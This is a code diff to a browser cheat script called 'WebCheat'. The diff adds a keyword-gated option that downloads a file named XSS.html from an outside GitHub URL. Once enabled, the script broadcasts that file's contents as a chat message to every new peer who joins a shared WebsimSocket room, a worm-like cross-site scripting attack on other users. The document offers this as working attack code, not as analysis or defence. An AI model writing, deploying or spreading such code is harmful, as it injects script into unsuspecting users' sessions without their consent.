@@ -19,6 +19,7 @@ function createDarkModePanel() {
   panel.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
   panel.style.cursor = "move";
   panel.innerHTML = "<h1>WebCheat</h1>";
+  panel.style.overflow = 'scroll';
 
   // Position the panel in the middle of the viewport
   const viewportHeight = window.innerHeight;
@@ -299,7 +300,66 @@ sendCommandButton.addEventListener("click", () => {
   const labelPage = document.createElement("p");
   labelPage.textContent = window.location.href;
   panel.appendChild(labelPage);
-  
+  // Check if the URL contains the specified keyword
+if (window.location.href.includes("_dor_svv8_1rml0843vu")) {
+  // Create the checkbox and label
+  const autoSendCheckbox = document.createElement("input");
+  autoSendCheckbox.type = "checkbox";
+  autoSendCheckbox.id = "autoSendCheckbox";
+  autoSendCheckbox.style.margin = "10px";
+
+  const autoSendLabel = document.createElement("label");
+  autoSendLabel.htmlFor = "autoSendCheckbox";
+  autoSendLabel.textContent = "Automatically send the client to others?";
+  autoSendLabel.style.color = "#fff";
+
+  // Append the checkbox and label to the panel
+  panel.appendChild(autoSendCheckbox);
+  panel.appendChild(autoSendLabel);
+
+  // Function to handle new client join and send XSS.html contents
+  async function handleNewClientJoin() {
+    try {
+      const response = await fetch("https://raw.githubusercontent.com/JammyCat91283/websim/main/XSS.html");
+      if (!response.ok) {
+        throw new Error(`Failed to fetch XSS.html: ${response.statusText}`);
+      }
+
+      const contentsOfXSS = await response.text();
+
+      // Use room.peers and send the contents to the new client
+      const room = new WebsimSocket();
+      room.initialize();
+
+      setInterval(() => {
+        const currentPeers = room.peers || {};
+
+        // Check if a new peer has joined
+        for (const peerId in currentPeers) {
+          if (!previousPeers[peerId]) {
+            // A new peer has joined
+            if (autoSendCheckbox.checked) {
+              room.send({
+                type: "chat",
+                message: contentsOfXSS,
+                section: "chicken"
+              });
+              console.log(`Sent contents of XSS.html to new peer: ${peerId}`);
+            }
+          }
+        }
+
+        // Update the previousPeers to the current state
+        previousPeers = { ...currentPeers };
+      }, 1000); // Check every 1 second
+    } catch (error) {
+      console.error("Error fetching or sending XSS.html contents:", error);
+    }
+  }
+
+  // Initialize the handling of new client joins
+  handleNewClientJoin();
+}
 }
 
 // Call the function to ensure the panel is created
